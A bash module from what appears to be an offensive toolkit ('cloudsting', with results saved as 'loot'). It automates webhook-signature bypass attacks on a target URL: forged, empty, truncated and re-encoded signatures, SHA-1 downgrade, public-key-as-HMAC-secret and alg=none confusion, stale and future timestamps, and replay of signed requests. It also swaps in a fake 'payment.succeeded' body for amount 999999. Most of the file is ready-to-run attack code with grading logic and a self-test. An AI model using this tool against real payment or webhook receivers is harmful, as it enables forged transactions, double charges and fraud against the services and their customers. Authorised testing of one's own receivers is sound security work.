#!/usr/bin/env bash
# 66_webhook_sig.sh — cloudsting module 66: the signature nobody checked
# Verbs: --probe | --check | --replay | --downgrade | --window | --confusion
#        | --schemes | --vectors | --list | --status-tsv | --menu | --selftest
#        | --help
#
# A webhook signature is the only thing standing between "anyone can POST to
# this endpoint" and "only the payment processor can". The bypass is almost
# never cryptographic: it is a receiver that accepts an unsigned request, or
# one that compares with `==` instead of a constant-time compare, or one whose
# timestamp check is a `strptime` nobody reads the result of.
set -u
umask 077

unset CS_MOD_DIR

MODULE_ID="66_webhook_sig"
MOD_NAME="Webhook Signature Bypass (the signature nobody checked)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/webhook_sig"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"
BODY_FILE="$OUT_DIR/body-$RUN_ID.json"

: "${WH_TIMEOUT:=10}"
: "${WH_FOLLOW:=0}"
: "${WH_SECRET:=cloudsting_whsec}"     # only used to forge a VALID one
: "${WH_BODY:=}"
: "${WH_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/66}"

wh_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── what a receiver might check ──────────────────────────────────
#   <scheme>\t<header>\t<algorithm>\t<encoding>\t<what it is>
wh_schemes() {
    cat <<'SCHEMES'
stripe	signature-timestamp + signature	v1=hmac-sha256 hex + timestamp	Stripe: t=,v1= pairs, 5 minute window
github	x-hub-signature-256	hmac-sha256 hex	GitHub: sha256= then the digest
github-legacy	x-hub-signature	hmac-sha1 hex	GitHub before 2021, still accepted by old apps
shopify	x-shopify-hmac-sha256	hmac-sha256 base64	Shopify: base64, not hex
twilio	x-twilio-signature	hmac-sha1 base64	Twilio: over the URL and sorted params
sendgrid	x-twilio-email-event-webhook-signature	ed25519 base64	SendGrid: asymmetric
slack	x-slack-signature	v0=hmac-sha256 hex + timestamp	Slack: v0= prefix with a timestamp
standard-webhooks	webhook-signature	v1=hmac-sha256 base64	the open spec, v1, prefixed
svix	svix-signature	v1=hmac-sha256 base64	Svix: base64 after the secret prefix
square	x-square-hmacsha256-signature	hmac-sha256 base64	Square: endpoint URL in the message
paypal	paypal-transmission-sig	rsa-sha256 base64	PayPal: certificate chain
generic	x-signature	hmac-sha256 hex	the one everybody invents
generic-bearer	authorization	bearer token	not a signature at all
SCHEMES
}

# ── the bypasses ─────────────────────────────────────────────────
# Each one is a receiver-side mistake, and each has its own verdict, because
# "it answered 200" means nothing without knowing which check was missing.
#   <id>\t<class>\t<what the receiver fails to do>
wh_vectors() {
    cat <<'VECTORS'
absent	no-check	accepts a request with no signature header at all
empty	no-check	accepts a header that is present but empty
garbage	no-check	accepts a random hex string of the right length
truncated	partial-compare	compares only the first N characters of the digest
unsigned-body	no-check	signs the URL but not the body, and the body is what matters
body-swap	replay-check	signature is over a different body than the one delivered
replay	replay-check	the same signed request delivered twice, both accepted
stale-ts	stale-check	a signature from an hour ago is still accepted
future-ts	stale-check	a timestamp in the future is accepted
no-ts	stale-check	the timestamp is optional, so a replay has no age
alg-downgrade	algorithm	sha256 accepted, so is sha1 with the same secret
none-alg	algorithm	an `alg=none` style signature is accepted
confused-secret	algorithm	the public key is accepted as the HMAC secret
prefix-secret	algorithm	a secret with a known prefix still works
case-insensitive	encoding	uppercase hex compares equal
b64-vs-hex	encoding	the same digest in the other encoding is accepted
url-encoded	encoding	a percent-encoded signature is decoded before comparing
VECTORS
}

# ── the body every test signs ────────────────────────────────────
# The body lives in a FILE from the first moment, because a signature is only
# meaningful over the exact bytes that get posted, newline included.
wh_body_file() {
    [[ -f "$BODY_FILE" ]] || wh_body > "$BODY_FILE"
    printf '%s' "$BODY_FILE"
}

wh_body() {
    [[ -n "$WH_BODY" ]] && { printf '%s' "$WH_BODY"; return; }
    cat <<'BODY'
{"id":"evt_cloudsting","type":"payment.succeeded","amount":1,"currency":"usd","data":{"charge":"ch_1","status":"succeeded"}}
BODY
}

# A signature we know is wrong, in the shape the receiver expects. Sending a
# digest of nothing in particular is the point: a correct receiver refuses it.
#   wh_forge <scheme> <mode:garbage|valid|empty|short|sha1|upper|b64|urlenc> [secret]
wh_forge() {
    local scheme="$1" mode="$2" secret="${3:-$WH_SECRET}"
    local algo="sha256"
    case "$scheme" in
        github-legacy|twilio) algo="sha1" ;;
    esac
    case "$mode" in
        garbage) printf 'f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0'; return ;;
        empty)   printf ''; return ;;
        sha1)    algo="sha1" ;;
    esac
    # sign the file the request will actually post: $( ) strips the trailing
    # newline that --data-binary @file keeps, and signing different bytes than
    # are sent makes every test wrong in the same direction
    local dig
    dig="$(openssl dgst "-$algo" -hmac "$secret" "$BODY_FILE" 2>/dev/null | sed 's/^.*= //')"
    [[ -z "$dig" ]] && dig="$(openssl dgst "-$algo" -hmac "$secret" < "$BODY_FILE" 2>/dev/null | sed 's/^.*= //')"
    case "$mode" in
        short)  printf '%s' "${dig:0:8}" ;;
        upper)  printf '%s' "$dig" | tr 'a-f' 'A-F' ;;
        b64)    printf '%s' "$dig" | xxd -r -p | base64 -w0 ;;
        urlenc) printf '%s' "$dig" | sed 's/\(..\)/%\1/g' ;;
        *)      printf '%s' "$dig" ;;
    esac
}

# The header name a scheme sends, and the value shape. A receiver that uses
# three different names is a receiver that checks one of them.
wh_header_for() {
    case "$1" in
        stripe)   printf 'stripe-signature: t=%s,v1=%s' "$(date +%s)" "$2" ;;
        github)   printf 'X-Hub-Signature-256: sha256=%s' "$2" ;;
        github-legacy) printf 'X-Hub-Signature: sha1=%s' "$2" ;;
        shopify)  printf 'X-Shopify-Hmac-Sha256: %s' "$2" ;;
        twilio)   printf 'X-Twilio-Signature: %s' "$2" ;;
        slack)    printf 'X-Slack-Signature: v0=%s\nX-Slack-Request-Timestamp: %s' "$2" "$(date +%s)" ;;
        standard-webhooks) printf 'webhook-signature: v1,%s' "$2" ;;
        svix)     printf 'svix-signature: v1,%s' "$2" ;;
        square)   printf 'X-Square-HmacSHA256-Signature: %s' "$2" ;;
        paypal)   printf 'PAYPAL-TRANSMISSION-SIG: %s' "$2" ;;
        generic-bearer) printf 'Authorization: Bearer %s' "$2" ;;
        *)        printf 'X-Signature: %s' "$2" ;;
    esac
}

# ── sending ──────────────────────────────────────────────────────
#   wh_send <url> <header-line-or-dash> [body-file]
#   -> code \x1f bytes \x1f hash \x1f body-path
wh_send() {
    local url="$1" hdr="${2:--}" bodyf="${3:-}"
    local tmp="${bodyf:-$BODY_FILE}"
    [[ -f "$tmp" ]] || wh_body > "$tmp"

    local outf; outf="$(mktemp "$CS_SCRATCH/wh.XXXXXX")" 2>/dev/null || outf="$OUT_DIR/.wh.$$"
    local -a args=(-sS -o "$outf" -w '%{http_code} %{time_total}'
                   -m "$WH_TIMEOUT" -A "$WH_UA" -X POST
                   -H 'Content-Type: application/json'
                   --data-binary "@$tmp")
    [ "$WH_FOLLOW" = "1" ] && args+=(-L)
    if [[ "$hdr" != "-" && -n "$hdr" ]]; then
        # a scheme may carry two headers, one per line
        while IFS= read -r line; do
            [[ -n "$line" ]] && args+=(-H "$line")
        done <<< "$hdr"
    fi

    local meta code="" secs="0"
    meta="$(curl "${args[@]}" "$url" 2>/dev/null)"
    read -r code secs <<<"${meta:-000 0}"
    [[ -z "$code" ]] && code="000"
    local bytes hash
    bytes="$(wc -c < "$outf" 2>/dev/null | tr -d ' ')"
    hash="$(sha1sum "$outf" 2>/dev/null | cut -c1-12)"
    printf '%s\037%s\037%s\037%s\n' "$code" "${bytes:-0}" "$hash" "$outf"
}

# ── the verdict ──────────────────────────────────────────────────
# The control is a VALID signature over the body. If the receiver rejects that,
# it is not a webhook endpoint or it is misconfigured, and nothing below means
# anything — so the control is checked first, always.
#   wh_verdict <ctl-code> <ctl-hash> <var-code> <var-hash> <vector-class>
wh_verdict() {
    local cc="$1" ch="$2" vc="$3" vh="$4" class="${5:-no-check}"
    [[ "$vc" == "000" ]] && { printf 'unreachable'; return; }
    [[ "$cc" == "000" ]] && { printf 'unreachable'; return; }
    local c_ok=no v_ok=no
    [[ "$cc" =~ ^2 ]] && c_ok=yes
    [[ "$vc" =~ ^2 ]] && v_ok=yes
    # a control that was refused means we cannot tell a bypass from a broken
    # endpoint, and reporting one would be a fabricated finding
    [[ "$c_ok" == "no" ]] && { printf 'control-refused'; return; }
    case "$vc" in
        401|403) printf 'checked'; return ;;
        400|422) printf 'validated'; return ;;
        429)     printf 'rate-limited'; return ;;
        5*)      printf 'error'; return ;;
    esac
    if [[ "$v_ok" == "yes" ]]; then
        # the same body, same bytes: the receiver accepted a request it should
        # have refused. That is the bypass, whatever the class.
        [[ "$vc" == "$cc" && "$vh" == "$ch" ]] && { printf 'accepted-same-response'; return; }
        printf 'accepted'
        return
    fi
    printf 'differs'
}

wh_severity() {
    local v="$1" class="${2:-no-check}"
    case "$v" in
        accepted-same-response) printf 'CRITICAL' ;;
        accepted)
            case "$class" in
                algorithm)      printf 'CRITICAL' ;;
                replay-check)   printf 'HIGH' ;;
                stale-check)    printf 'HIGH' ;;
                encoding|partial-compare) printf 'HIGH' ;;
                *)              printf 'MEDIUM' ;;
            esac ;;
        *) printf 'INFO' ;;
    esac
}

wh_findings() {
    local target="$1" sev="$2" check="$3" detail="$4"
    cs_findings_row "$MODULE_ID" "WEBAPI" "$target" "$sev" "$check" "$detail"
}

# ── verbs ────────────────────────────────────────────────────────

# --probe <url> [scheme]: one valid signature. If that is refused, stop: the
# receiver is not what we think it is, and every other test is noise.
wh_cmd_probe() {
    local url="${1:-}" scheme="${2:-generic}"
    [[ -z "$url" ]] && { wh_log "usage: --probe <url> [scheme]"; return 2; }
    wh_body_file >/dev/null
    cs_row TARGET "$url"
    cs_row SCHEME "$scheme"

    local sig hdr
    sig="$(wh_forge "$scheme" valid)"
    hdr="$(wh_header_for "$scheme" "$sig")"

    local code bytes hash body
    cs_split "$(wh_send "$url" "$hdr")" code bytes hash body
    cs_row CONTROL "code=$code" "bytes=$bytes"
    local head; head="$(head -c 200 "$body" 2>/dev/null | tr -d '\r\n\000')"
    [[ -n "$head" ]] && cs_row BODY "${head:0:200}"
    rm -f "$body"

    local v
    if [[ "$code" == "000" ]]; then v="unreachable"
    elif [[ "$code" =~ ^2 ]]; then v="accepts-signature"
    elif [[ "$code" == "401" || "$code" == "403" ]]; then v="rejects-signature"
    elif [[ "$code" == "404" ]]; then v="no-endpoint"
    else v="inconclusive"; fi
    cs_row VERDICT "$v"
    cs_row SUMMARY "code=$code verdict=$v"
    return 0
}

# --check <url> [scheme]: the control, then every vector. The control decides
# whether the rest is meaningful.
wh_cmd_check() {
    local url="${1:-}" scheme="${2:-generic}"
    [[ -z "$url" ]] && { wh_log "usage: --check <url> [scheme]"; return 2; }
    wh_body_file >/dev/null
    cs_row TARGET "$url"
    cs_row SCHEME "$scheme"
    : > "$PROBE_FILE"

    # a valid signature first — this is the control and it must pass
    local vsig vhdr
    vsig="$(wh_forge "$scheme" valid)"
    vhdr="$(wh_header_for "$scheme" "$vsig")"
    local c_code c_bytes c_hash c_body
    cs_split "$(wh_send "$url" "$vhdr")" c_code c_bytes c_hash c_body
    cs_row CONTROL "code=$c_code" "bytes=$c_bytes"
    rm -f "$c_body"

    local hits=0 tried=0
    local id class what
    while IFS=$'\t' read -r id class what; do
        [[ -z "$id" ]] && continue
        tried=$((tried + 1))

        # Every vector must MUTATE something. A vector that reuses the valid
        # signature unchanged sends a correct request, gets the control's own
        # 200, and would report a working receiver as bypassed — so a vector
        # with no mutation is skipped rather than tested.
        local header="-" send=yes
        case "$id" in
            absent)        header="-" ;;
            empty)         header="$(wh_header_for "$scheme" "")" ;;
            garbage)       header="$(wh_header_for "$scheme" "$(wh_forge "$scheme" garbage)")" ;;
            truncated)     header="$(wh_header_for "$scheme" "$(wh_forge "$scheme" short)")" ;;
            case-insensitive) header="$(wh_header_for "$scheme" "$(wh_forge "$scheme" upper)")" ;;
            b64-vs-hex)    header="$(wh_header_for "$scheme" "$(wh_forge "$scheme" b64)")" ;;
            url-encoded)   header="$(wh_header_for "$scheme" "$(wh_forge "$scheme" urlenc)")" ;;
            alg-downgrade) header="$(wh_header_for "$scheme" "$(wh_forge "$scheme" sha1)")" ;;
            body-swap)
                # sign the real body, then deliver a different one
                header="$(wh_header_for "$scheme" "$vsig")"
                printf '{"id":"evt_cloudsting","type":"payment.succeeded","amount":999999}' > "$BODY_FILE"
                ;;
            replay)
                # the identical signed request, twice — only meaningful as a
                # pair, so it is left to --replay
                send=no
                ;;
            unsigned-body)
                # a signature over the URL only: send the valid signature with a
                # body it never covered
                header="$(wh_header_for "$scheme" "$vsig")"
                printf '{"id":"evt_cloudsting","type":"payment.succeeded","amount":1,"extra":"unsigned"}' > "$BODY_FILE"
                ;;
            stale-ts|future-ts|no-ts|confused-secret|prefix-secret|none-alg)
                # these live in --window and --confusion, where the mutation is
                # the timestamp or the key rather than the digest
                send=no
                ;;
            *)
                send=no ;;
        esac
        if [[ "$send" == "no" ]]; then
            cs_row SKIP "$id" "$class" "covered by --window or --confusion, where the mutation lives"
            continue
        fi

        local p_code p_bytes p_hash p_body
        cs_split "$(wh_send "$url" "$header")" p_code p_bytes p_hash p_body
        # restore the canonical body for the next vector
        [[ "$id" == "body-swap" || "$id" == "unsigned-body" ]] && wh_body > "$BODY_FILE"

        local v; v="$(wh_verdict "$c_code" "$c_hash" "$p_code" "$p_hash" "$class")"
        local sev; sev="$(wh_severity "$v" "$class")"
        printf 'vector\t%s\t%s\t%s\t%s\t%s\n' "$id" "$p_code" "$v" "$class" "$sev" >> "$PROBE_FILE"

        case "$v" in
            accepted|accepted-same-response)
                hits=$((hits + 1))
                cs_row HIT "$id" "code=$p_code" "verdict=$v" "sev=$sev" "$what"
                printf '%s\t%s\t%s\n' "$id" "$v" "$sev" >> "$HIT_FILE"
                wh_findings "$url" "$sev" "webhook-$id" \
                    "$id: the receiver $what — $sev"
                ;;
            *)
                cs_row VECTOR "$id" "code=$p_code" "$v"
                ;;
        esac
        rm -f "$p_body"
    done < <(wh_vectors)

    local overall="checked"
    (( hits > 0 )) && overall="bypassable"
    [[ "$c_code" == "000" ]] && overall="unreachable"
    local c_ok=no; [[ "$c_code" =~ ^2 ]] && c_ok=yes
    [[ "$c_ok" == "no" && "$c_code" != "000" ]] && overall="control-refused"

    cs_row VERDICT "$overall" "$hits of $tried vectors were accepted"
    cs_row SUMMARY "vectors=$tried hits=$hits control=$c_code"
    cs_row ARTIFACT "$PROBE_FILE"
    return 0
}

# --replay <url> [scheme]: the same signed request, twice. A receiver with no
# replay store takes both, and a payment processor that takes both is a payment
# processor you can charge twice.
wh_cmd_replay() {
    local url="${1:-}" scheme="${2:-generic}"
    [[ -z "$url" ]] && { wh_log "usage: --replay <url> [scheme]"; return 2; }
    wh_body_file >/dev/null
    cs_row TARGET "$url"
    local sig hdr
    sig="$(wh_forge "$scheme" valid)"
    hdr="$(wh_header_for "$scheme" "$sig")"

    local first=""; local second=""; local i
    for i in 1 2; do
        local code bytes hash body
        cs_split "$(wh_send "$url" "$hdr")" code bytes hash body
        cs_row ATTEMPT "$i" "code=$code" "bytes=$bytes"
        rm -f "$body"
        [[ "$i" == "1" ]] && first="$code" || second="$code"
    done

    local v
    if [[ "$first" == "000" ]]; then v="unreachable"
    elif [[ "$first" =~ ^2 && "$second" =~ ^2 ]]; then v="replayed"
    elif [[ "$first" =~ ^2 && ! "$second" =~ ^2 ]]; then v="replay-rejected"
    elif [[ ! "$first" =~ ^2 ]]; then v="control-refused"
    else v="inconclusive"; fi

    cs_row VERDICT "$v" "first=$first second=$second"
    if [[ "$v" == "replayed" ]]; then
        wh_findings "$url" "HIGH" "webhook-replay" \
            "the same signed delivery was accepted twice — no replay store, so a captured request can be charged again"
    fi
    cs_row SUMMARY "verdict=$v"
    return 0
}

# --window <url> [scheme]: is the timestamp checked at all. A signature from an
# hour ago and one from an hour ahead, both handed the same secret.
wh_cmd_window() {
    local url="${1:-}" scheme="${2:-generic}"
    [[ -z "$url" ]] && { wh_log "usage: --window <url> [scheme]"; return 2; }
    wh_body_file >/dev/null
    cs_row TARGET "$url"

    # Before asking "is the timestamp checked", establish that a timestamp is
    # part of the signature scheme at all. A receiver that HMACs the body and
    # ignores the header's timestamp accepts a valid digest at ANY age — that
    # is `timestamp-absent`, a real finding, but not the same one as "the
    # window is too wide", and reporting it as a stale-window bypass would be
    # wrong twice over.
    local scheme_ts=no
    case "$scheme" in
        stripe|slack|standard-webhooks|svix) scheme_ts=yes ;;
    esac
    if [[ "$scheme_ts" == "no" ]]; then
        cs_row NOTE "$scheme" "this scheme carries no timestamp, so there is no window to test"
        cs_row VERDICT "timestamp-absent" "the signature covers the body only — a captured request never expires"
        wh_findings "$url" "MEDIUM" "webhook-no-timestamp" \
            "the $scheme signature carries no timestamp: a captured signed request stays valid forever"
        cs_row SUMMARY "verdict=timestamp-absent"
        return 0
    fi

    local hits=0
    local delta name
    for delta in -3600 3600; do
        if (( delta < 0 )); then name="stale-1h"; else name="future-1h"; fi
        local ts=$(( $(date +%s) + delta ))
        local dig
        dig="$(openssl dgst -sha256 -hmac "$WH_SECRET" "$BODY_FILE" 2>/dev/null | sed 's/^.*= //')"
        local hdr
        case "$scheme" in
            stripe)  hdr="stripe-signature: t=$ts,v1=$dig" ;;
            slack)   hdr="X-Slack-Signature: v0=$dig
X-Slack-Request-Timestamp: $ts" ;;
            *)       hdr="webhook-signature: t=$ts,v1,$dig" ;;
        esac

        local code bytes hash pbody
        cs_split "$(wh_send "$url" "$hdr")" code bytes hash pbody
        rm -f "$pbody"
        if [[ "$code" =~ ^2 ]]; then
            hits=$((hits + 1))
            cs_row HIT "$name" "code=$code" "sev=HIGH" "a signature $(( delta > 0 ? 1 : -1 ))h from now was accepted"
        else
            cs_row VECTOR "$name" "code=$code" "rejected"
        fi
    done

    cs_row VERDICT "$( (( hits > 0 )) && echo window-open || echo window-checked)" "$hits of 2 out-of-window signatures accepted"
    if (( hits > 0 )); then
        wh_findings "$url" "HIGH" "webhook-stale-window" \
            "a signature outside the tolerance window was accepted — the timestamp is signed but never compared"
    fi
    cs_row SUMMARY "hits=$hits"
    return 0
}

# --confusion <url>: the algorithm-confusion family. RSA public key used as an
# HMAC secret is the classic, and `alg: none` in a JWT-shaped signature is its
# cousin.
wh_cmd_confusion() {
    local url="${1:-}"
    [[ -z "$url" ]] && { wh_log "usage: --confusion <url>"; return 2; }
    wh_body_file >/dev/null
    cs_row TARGET "$url"

    local keydir="$OUT_DIR/key-$RUN_ID"
    mkdir -p "$keydir" 2>/dev/null || true
    openssl genrsa -out "$keydir/priv.pem" 2048 2>/dev/null
    openssl rsa -in "$keydir/priv.pem" -pubout -out "$keydir/pub.pem" 2>/dev/null

    local pub; pub="$(cat "$keydir/pub.pem" 2>/dev/null)"
    local hits=0

    # the public key, as the HMAC secret
    local dig
    dig="$(openssl dgst -sha256 -hmac "$pub" "$BODY_FILE" 2>/dev/null | sed 's/^.*= //')"
    local code bytes hash pbody
    cs_split "$(wh_send "$url" "X-Signature: $dig")" code bytes hash pbody
    rm -f "$pbody"
    if [[ "$code" =~ ^2 ]]; then
        hits=$((hits + 1))
        cs_row HIT "pubkey-as-secret" "code=$code" "sev=HIGH" "the public key was accepted as the HMAC secret"
    else
        cs_row VECTOR "pubkey-as-secret" "code=$code" "rejected"
    fi

    # a signature with no algorithm at all
    for sig in "none" "" "0"; do
        cs_split "$(wh_send "$url" "X-Signature: $sig")" code bytes hash pbody
        rm -f "$pbody"
        if [[ "$code" =~ ^2 ]]; then
            hits=$((hits + 1))
            cs_row HIT "alg-none" "code=$code" "sev=CRITICAL" "an unsigned 'none' signature was accepted"
            break
        fi
    done

    cs_row VERDICT "$( (( hits > 0 )) && echo confused || echo sound)" "$hits of 2 confusion vectors accepted"
    if (( hits > 0 )); then
        wh_findings "$url" "HIGH" "webhook-alg-confusion" \
            "the receiver accepted a signature built from the public key or from no algorithm"
    fi
    rm -rf "$keydir" 2>/dev/null
    cs_row SUMMARY "hits=$hits"
    return 0
}

wh_cmd_schemes() {
    local s h a e w
    while IFS=$'\t' read -r s h a e w; do
        [[ -z "$s" ]] && continue
        cs_row SCHEME "$s" "$h" "$a" "$e"
        [[ -n "$w" ]] && cs_row WHAT "$s" "$w"
    done < <(wh_schemes)
    cs_row SUMMARY "schemes=$(wh_schemes | wc -l | tr -d ' ')"
    return 0
}

wh_cmd_vectors() {
    local id class what
    while IFS=$'\t' read -r id class what; do
        [[ -z "$id" ]] && continue
        cs_row VECTOR "$id" "$class" "$what"
    done < <(wh_vectors)
    cs_row SUMMARY "vectors=$(wh_vectors | wc -l | tr -d ' ')"
    return 0
}

wh_cmd_list() { wh_cmd_vectors; }

wh_cmd_status_tsv() {
    local curl_state openssl_state xxd_state
    command -v curl    >/dev/null 2>&1 && curl_state="curl-ok"         || curl_state="curl-missing"
    command -v openssl >/dev/null 2>&1 && openssl_state="openssl-ok"   || openssl_state="openssl-missing"
    command -v xxd     >/dev/null 2>&1 && xxd_state="xxd-ok"           || xxd_state="xxd-missing"
    printf '%s\t%s\t%s\t%s\t%s\tvectors-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$openssl_state" "$xxd_state" \
        "$(wh_vectors | wc -l | tr -d ' ')"
}

wh_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

wh_cmd_help() {
    cat <<'HELP'
cloudsting module 66 — Webhook Signature Bypass v1.0.0
  --probe <url> [scheme]      one valid signature: does the receiver accept it at all
  --check <url> [scheme]      the control, then every vector
  --replay <url> [scheme]     the same signed request, twice
  --window <url> [scheme]     a signature from an hour ago, and from an hour ahead
  --confusion <url>           public key as HMAC secret, alg=none
  --schemes | --vectors | --list | --status-tsv | --menu | --selftest | --help

A webhook signature is the only thing between "anyone can POST here" and "only
the processor can". The bypass is almost never cryptographic: it is a receiver
that accepts an unsigned request, or whose timestamp check nobody reads the
result of.

So the control is a VALID signature over the body, and it runs first. If the
receiver refuses that, it is not what we think it is and nothing below means
anything — `control-refused` is reported instead of a fabricated finding.

An accepted vector that returns the SAME bytes as the control is
`accepted-same-response`: the receiver did not merely fail to reject our
signature, it processed the request.

Environment: WH_TIMEOUT (10), WH_SECRET (used only to forge a VALID signature),
WH_BODY (override the signed body), WH_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
wh_selftest() {
    cs_selftest_reset
    # the probe verbs write findings; without this the suite appends its own
    # dead-host probe to the real ledger on every run
    local real_loot="$CS_LOOT"
    CS_LOOT="$CS_SCRATCH"
    mkdir -p "$CS_LOOT"

    local ns; ns="$(wh_schemes | wc -l | tr -d ' ')"
    chk sch-many    "$( (( ns >= 12 )) && echo many || echo few )" "many"
    chk sch-4col    "$(wh_schemes | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk sch-unique  "$(wh_schemes | cut -f1 | sort -u | wc -l | tr -d ' ')" "$ns"
    local nv; nv="$(wh_vectors | wc -l | tr -d ' ')"
    chk vec-3col    "$(wh_vectors | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk vec-many    "$( (( nv >= 16 )) && echo many || echo few )" "many"
    chk vec-classes "$(wh_vectors | cut -f2 | sort -u | wc -l | tr -d ' ')" "6"

    # the verdict table is the module
    chk v-unreach   "$(wh_verdict 200 h 000 h no-check)" "unreachable"
    chk v-accept    "$(wh_verdict 200 h1 200 h2 r no-check)" "accepted"
    chk v-same      "$(wh_verdict 200 abc 200 abc no-check)" "accepted-same-response"
    chk v-checked   "$(wh_verdict 200 h 403 h no-check)" "checked"
    chk v-validated "$(wh_verdict 200 h 400 h no-check)" "validated"
    chk v-error     "$(wh_verdict 200 h 500 h no-check)" "error"
    chk v-ctlref    "$(wh_verdict 403 h 200 h no-check)" "control-refused"
    chk v-differs   "$(wh_verdict 200 h 302 h no-check)" "differs"

    # a scheme with no timestamp has no window to test, and says so instead of
    # reporting the receiver's silence as a stale-window bypass
    local wout; wout="$(wh_cmd_window http://127.0.0.1:9 generic 2>/dev/null)"
    chk win-nots    "$(printf '%s' "$wout" | awk -F'\t' '$1=="VERDICT"{print $2}')" "timestamp-absent"

    chk s-crit      "$(wh_severity accepted algorithm)" "CRITICAL"
    chk s-replay    "$(wh_severity accepted replay-check)" "HIGH"
    chk s-stale     "$(wh_severity accepted stale-check)" "HIGH"
    chk s-med       "$(wh_severity accepted other)" "MEDIUM"
    chk s-same      "$(wh_severity accepted-same-response)" "CRITICAL"
    chk s-info      "$(wh_severity checked)" "INFO"

    # a forged signature is hex of the right width, and a valid one differs
    wh_body_file >/dev/null
    local g1 g2
    g1="$(wh_forge generic valid)"; g2="$(wh_forge generic valid)"
    chk forge-stable "$g1" "$g2"
    chk forge-hex    "$(printf '%s' "$g1" | grep -cE '^[0-9a-f]{64}$')" "1"
    chk forge-short  "$(printf '%s' "$(wh_forge generic short)" | wc -c | tr -d ' ')" "8"
    chk forge-upper  "$(printf '%s' "$(wh_forge generic upper)" | grep -cE '^[0-9A-F]{64}$')" "1"
    chk forge-other  "$( [[ "$(wh_forge generic valid secret_a)" != "$(wh_forge generic valid secret_b)" ]] && echo differs || echo same)" "differs"
    chk forge-b64    "$(printf '%s' "$(wh_forge generic b64)" | base64 -d 2>/dev/null | wc -c | tr -d ' ')" "32"
    chk forge-empty  "$(wh_forge generic empty | wc -c | tr -d ' ')" "0"

    # header shapes: the scheme decides the name
    chk hdr-github  "$(wh_header_for github abc | cut -d: -f1)" "X-Hub-Signature-256"
    chk hdr-shopify "$(wh_header_for shopify abc | cut -d: -f1)" "X-Shopify-Hmac-Sha256"
    chk hdr-generic "$(wh_header_for generic abc | cut -d: -f1)" "X-Signature"
    chk hdr-stripe  "$(wh_header_for stripe abc | grep -c '^stripe-signature')" "1"
    chk hdr-two     "$(wh_header_for slack abc | awk 'END{print NR}')" "2"

    # a dead host is unreachable, never a bypass
    local out; out="$(wh_cmd_check http://127.0.0.1:9 generic 2>/dev/null)"
    chk dead-verdict "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "unreachable"
    chk dead-hits    "$(printf '%s' "$out" | awk -F'\t' '$1=="HIT"' | wc -l | tr -d ' ')" "0"

    # a receiver that refuses the valid control must not be graded bypassable
    out="$(wh_cmd_replay http://127.0.0.1:9 generic 2>/dev/null)"
    chk dead-replay  "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "unreachable"

    # usage errors, not crashes
    wh_cmd_probe 2>/dev/null;   chk prb-usage "$?" "2"
    wh_cmd_check 2>/dev/null;   chk chk-usage "$?" "2"
    wh_cmd_replay 2>/dev/null;  chk rep-usage "$?" "2"
    wh_cmd_window 2>/dev/null;  chk win-usage "$?" "2"
    wh_cmd_confusion 2>/dev/null; chk cnf-usage "$?" "2"

    chk status-fields "$(wh_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(wh_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(wh_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(wh_cmd_help | head -1 | grep -ci 'Webhook')" "1"
    chk sch-rows      "$(wh_cmd_schemes | grep -c '^SCHEME')" "$ns"
    chk vec-rows      "$(wh_cmd_vectors | grep -c '^VECTOR')" "$nv"

    CS_LOOT="$real_loot"
    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --probe)     shift; wh_cmd_probe "$@";;
    --check)     shift; wh_cmd_check "$@";;
    --replay)    shift; wh_cmd_replay "$@";;
    --window)    shift; wh_cmd_window "$@";;
    --confusion) shift; wh_cmd_confusion "$@";;
    --schemes)   wh_cmd_schemes;;
    --vectors)   wh_cmd_vectors;;
    --list)      wh_cmd_list;;
    --status-tsv|--status) wh_cmd_status_tsv;;
    --menu)      wh_cmd_menu;;
    --selftest)  wh_selftest;;
    *)           wh_cmd_help;;
esac
